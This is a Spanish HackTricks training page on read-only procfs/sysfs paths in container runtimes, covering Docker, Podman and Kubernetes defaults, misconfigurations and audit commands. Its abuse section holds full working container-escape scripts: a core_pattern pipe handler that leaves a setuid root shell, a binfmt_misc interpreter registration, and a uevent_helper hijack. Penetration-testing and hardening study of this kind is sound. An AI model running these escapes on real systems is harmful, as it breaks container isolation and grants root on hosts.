# Rutas del sistema de solo lectura

{{#include ../../../../banners/hacktricks-training.md}}

Las rutas del sistema en solo lectura son una protección independiente de las rutas enmascaradas. En lugar de ocultar una ruta por completo, el runtime la expone pero la monta como solo lectura. Esto es común en ubicaciones seleccionadas de procfs y sysfs donde el acceso de lectura puede ser aceptable o necesario operativamente, pero las escrituras serían demasiado peligrosas.

## Operación

Los runtimes frecuentemente marcan partes de la vista proc/sys como solo lectura. Dependiendo del runtime y del host, esto puede incluir rutas como:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

La lista real varía, pero el modelo es el mismo: permitir la visibilidad donde sea necesaria, negar la modificación por defecto.

## Laboratorio

Inspeccione la lista de rutas de solo lectura declarada por Docker:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Inspeccione la vista montada proc/sys desde dentro del contenedor:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Impacto en la seguridad

Las rutas del sistema montadas en modo solo lectura reducen una amplia clase de abusos con impacto en el host. Incluso cuando un atacante puede inspeccionar procfs o sysfs, la imposibilidad de escribir allí elimina muchas vías de modificación directa que implican parámetros del kernel, manejadores de fallos, ayudantes de carga de módulos u otras interfaces de control. La exposición no desaparece, pero la transición de divulgación de información a influencia sobre el host se vuelve más difícil.

## Misconfiguraciones

Los errores principales consisten en desenmascarar o remontar rutas sensibles como lectura-escritura, exponer el contenido de proc/sys del host directamente con bind mounts escribibles, o usar modos privilegiados que efectivamente eluden los valores por defecto más seguros del runtime. En Kubernetes, `procMount: Unmasked` y las cargas de trabajo privilegiadas a menudo van de la mano con una protección de proc más débil. Otro error operativo común es asumir que, dado que el runtime normalmente monta estas rutas como solo lectura, todas las cargas de trabajo siguen heredando ese comportamiento por defecto.

## Abuso

Si la protección es débil, empiece buscando entradas de proc/sys escribibles:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Cuando existan entradas con permiso de escritura, las rutas de seguimiento de alto valor incluyen:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
Qué pueden revelar estos comandos:

- Entradas escribibles bajo `/proc/sys` a menudo significan que el contenedor puede modificar el comportamiento del kernel del host en lugar de únicamente inspeccionarlo.
- `core_pattern` es especialmente importante porque un valor orientado al host que sea escribible puede convertirse en una ruta de ejecución de código en el host al provocar un crash de un proceso después de establecer un pipe handler.
- `modprobe` revela el helper usado por el kernel para los flujos relacionados con la carga de módulos; es un objetivo clásico de alto valor cuando es escribible.
- `binfmt_misc` te indica si el registro de intérpretes personalizados es posible. Si el registro es escribible, esto puede convertirse en una primitiva de ejecución en lugar de solo un information leak.
- `panic_on_oom` controla una decisión del kernel a nivel de host y por tanto puede convertir el agotamiento de recursos en un host denial of service.
- `uevent_helper` es uno de los ejemplos más claros de una ruta helper en sysfs escribible que produce ejecución en contexto del host.

Hallazgos interesantes incluyen parámetros proc orientados al host escribibles o entradas sysfs que normalmente deberían haber sido de solo lectura. En ese punto, la carga de trabajo ha pasado de una visión limitada del contenedor hacia una influencia significativa sobre el kernel.

### Ejemplo completo: `core_pattern` Host Escape

Si `/proc/sys/kernel/core_pattern` es escribible desde dentro del contenedor y apunta a la vista del kernel del host, puede abusarse de él para ejecutar un payload después de un crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Si la ruta realmente alcanza el kernel del host, el payload se ejecuta en el host y deja una shell setuid detrás.

### Ejemplo completo: registro de `binfmt_misc`

Si `/proc/sys/fs/binfmt_misc/register` es escribible, el registro de un intérprete personalizado puede producir ejecución de código cuando se ejecuta el archivo correspondiente:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
En un `binfmt_misc` orientado al host y escribible, el resultado es ejecución de código en la ruta del intérprete activada por el kernel.

### Ejemplo completo: `uevent_helper`

Si `/sys/kernel/uevent_helper` es escribible, el kernel puede invocar un host-path helper cuando se desencadene un evento coincidente:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
La razón por la que esto es tan peligroso es que la ruta del helper se resuelve desde la perspectiva del sistema de archivos del host en lugar de desde un contexto seguro exclusivo del contenedor.

## Comprobaciones

Estas comprobaciones determinan si la exposición de procfs/sysfs es de solo lectura donde se espera y si la carga de trabajo aún puede modificar interfaces del kernel sensibles.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Lo interesante aquí:

- Una hardened workload normal debería exponer muy pocas entradas escribibles en proc/sys.
- Las rutas `/proc/sys` escribibles a menudo son más importantes que el acceso de solo lectura ordinario.
- Si el runtime indica que una ruta es read-only pero en la práctica es escribible, revise cuidadosamente mount propagation, bind mounts y los privilege settings.

## Valores predeterminados del runtime

| Runtime / plataforma | Estado por defecto | Comportamiento por defecto | Debilitamiento manual común |
| --- | --- | --- | --- |
| Docker Engine | Habilitado por defecto | Docker define una lista por defecto de rutas de solo lectura para entradas sensibles de proc | exponer montajes host proc/sys, `--privileged` |
| Podman | Habilitado por defecto | Podman aplica rutas por defecto de solo lectura a menos que se relajen explícitamente | `--security-opt unmask=ALL`, amplios montajes de host, `--privileged` |
| Kubernetes | Hereda los valores predeterminados del runtime | Usa el modelo de rutas de solo lectura del runtime subyacente a menos que se debilite por la configuración del Pod o montajes del host | `procMount: Unmasked`, privileged workloads, montajes host proc/sys escribibles |
| containerd / CRI-O under Kubernetes | Predeterminado del runtime | Normalmente se basa en los valores predeterminados de OCI/runtime | igual que la fila de Kubernetes; cambios directos en la configuración del runtime pueden debilitar el comportamiento |

El punto clave es que las rutas del sistema de solo lectura suelen estar presentes como valor predeterminado del runtime, pero son fáciles de socavar con modos privileged o host bind mounts.
{{#include ../../../../banners/hacktricks-training.md}}
